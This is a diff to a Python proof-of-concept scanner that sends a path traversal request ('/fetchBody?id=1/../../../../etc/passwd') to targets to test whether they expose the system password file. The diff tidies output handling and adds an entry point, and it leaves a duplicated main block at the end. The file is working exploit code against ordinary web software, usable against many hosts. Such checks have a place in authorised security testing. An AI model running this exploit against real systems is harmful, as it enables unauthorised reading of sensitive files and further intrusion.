@@ -30,20 +30,20 @@ def banner():
 
 
 def poc(target):
-      url = target + "/fetchBody?id=1/../../../../../../../../etc/passwd"
+    url = target + "/fetchBody?id=1/../../../../../../../../etc/passwd"
     try:
         res = requests.get(url, headers=headers, verify=False, timeout=5)
         if res.status_code == 200:
             result = "[+]{} is vulnerable".format(target)
             print(result)
-            with open("{}".format(url), "a") as f:
+            with open("output.txt", "a") as f:
                 f.write(result + "\n")
         else:
             result = "[-]{} is not vulnerable".format(target)
             print(result)
             print()
     except:
-        print(f"[+] {target} error")
+        print(f"[-] {target} error")
         return False
 
 
@@ -65,6 +65,12 @@ def main():
         mp.join()
     else:
         parser.print_help()
+
+
+if __name__ == "__main__":
+    banner()
+    main()
+
 
 
 if __name__ == "__main__":
